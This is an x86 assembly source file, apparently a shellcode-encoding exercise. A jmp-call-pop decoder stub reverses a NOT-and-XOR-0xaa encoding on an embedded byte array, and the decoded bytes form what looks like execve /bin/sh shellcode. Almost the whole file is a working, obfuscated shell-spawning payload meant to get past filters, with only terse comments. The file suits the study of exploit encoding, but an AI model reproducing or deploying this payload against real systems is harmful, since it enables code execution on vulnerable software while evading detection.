global _start

section .text

_start:
        jmp short call_encoder ; change eip to call encoder
encoder:
        pop esi ; mov code to esi
loo:
;we add 0x55 at the end of shellcode becuse not 0x55 and zor with 0xaa will be zero
        xor ebx, ebx ; zero ebx
        mov byte bl, [esi] ; mov 1 byte to bl 
        not bl ; decoder step one not bl
        xor bl, 0xaa ; decoder step two xor with 0xaa
        jz code ; check if zero jmp to code 
        mov byte [esi], bl ; mov bl to code 
        inc esi ; to move esi pointer to the next byte
        jmp loo ; loop 



call_encoder:
        call encoder ; change eip to encoder and push code address to stack 
        code: db 0x64, 0x95, 0x05, 0x3d, 0x7a, 0x7a, 0x26, 0x3d, 0x3d, 0x7a, 0x37, 0x3c, 0x3b, 0xdc, 0xb6, 0x05, 0xdc, 0xb7, 0x06, 0xdc, 0xb4, 0xe5, 0x5e, 0x98, 0xd5, 0x55 




